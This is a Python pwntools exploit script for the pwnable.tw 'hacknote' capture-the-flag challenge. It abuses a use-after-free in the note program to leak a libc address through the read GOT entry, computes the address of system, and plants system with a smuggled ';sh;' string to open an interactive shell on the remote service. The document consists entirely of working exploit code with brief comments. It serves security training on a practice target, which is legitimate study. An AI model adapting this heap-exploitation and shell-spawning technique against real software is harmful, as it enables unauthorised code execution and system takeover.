#!/usr/bin/env python
from pwn import *

r = remote("chall.pwnable.tw",10102)
libc = ELF('libc_32.so.6')
elf = ELF('./hacknote')

def ad(size,content):
        r.recvuntil(":")
        r.sendline("1")
        r.recvuntil(":")
        r.sendline(str(size))
        r.recvuntil(":")
        r.sendline(content)

def de(index):
        r.recvuntil(":")
        r.sendline("2")
        r.recvuntil(":")
        r.sendline(str(index))

def dump(index):
        r.recvuntil(":")
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(index))

puts = 0x804862b
ad(32,"ddaa")  #0
ad(32,"ddaa")  #1
de(0)
de(1)
read_got = elf.got['read']     #got of read
libc_read_got = libc.symbols['read']    #offset of read
libc_system_got = libc.symbols['system']     #offset of system

payload = p32(puts)+p32(read_got)
ad(8,payload)
#now, we will write into read_got
dump(0)
r.recvuntil(":")
read_addr = u32(r.recv(4))
libc = read_addr - libc_read_got
system_addr = libc + libc_system_got
de(2)
ad(8,p32(system_addr)+";sh;")
#printf -> system
#system(system;sh;)
dump(0)
r.interactive()

